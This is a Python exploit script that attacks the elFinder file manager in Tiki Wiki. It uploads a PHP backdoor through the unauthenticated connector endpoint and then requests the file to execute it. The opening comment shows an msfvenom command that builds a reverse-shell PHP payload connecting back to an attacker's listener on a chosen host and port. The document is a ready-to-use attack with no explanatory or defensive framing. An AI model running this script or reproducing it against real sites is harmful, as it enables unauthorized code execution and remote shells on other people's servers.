# For some reason the exploit doesn't work with base64 encoded php payloads ie. don't use '-e php/base64'in msfvenom
# Eg. msfvenom --platform php -a php -p php/reverse_php LHOST=192.168.92.134 LPORT=4445 -o payload.php

import requests
import random
import string
import sys
import argparse

def randomString(length):
  return (''.join(random.choice(string.ascii_letters) for m in range(length)) + '.php')

def check(URL):
	res = requests.get(URL + "/vendor_extra/elfinder/elfinder.html")

	if res.status_code == 200:
		print("Target is vulnerable")
		return True
	else:
		print("Target is not vulnerable, exiting...")
		return False

def check_payload(path):
	try:
		f = open(path,'r')
		f.close
		return True
	except IOError:
		print("PHP payload file not found, exiting...")
		return False

def main(URL,php_path):
	
	if not check(URL):
		return 1
	if not check_payload(php_path):
		return 1

	filename = randomString(8 + random.randrange(4))

	multipart_form_data = {
		'cmd': (None, 'upload'),
		'target': (None, 'l1_Lw'),
		'upload[]': (filename,open('payload.php','r'), 'application/octet-stream')
	}

	hdrs = {
		'User-Agent': 'Mozilla Firefox',
		'Connection': 'close'
	}
		
	print("Uploading backdoor file: " + filename)

	resp = requests.post(URL + "/vendor_extra/elfinder/php/connector.minimal.php",files=multipart_form_data,headers=hdrs)

	if resp.status_code == 200:
		print("Backdoor succssfully created")
	else:
		print("Error on uploading file, exiting...")
		return 1

	print("Triggering the exploit...")

	resp_get = requests.get(URL + "/vendor_extra/elfinder/files/" + filename)

	return 0

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser._action_groups.pop()
	required = parser.add_argument_group('Required arguments')
	required.add_argument('-U','--url',help='URL of the Tiki Wiki page eg. http://webserver.com/tikiwiki',required=True)
	required.add_argument('-P','--php',help='Path to php payload eg. payload.php',required=True)
	args = parser.parse_args()
	sys.exit(main(args.url,args.php))
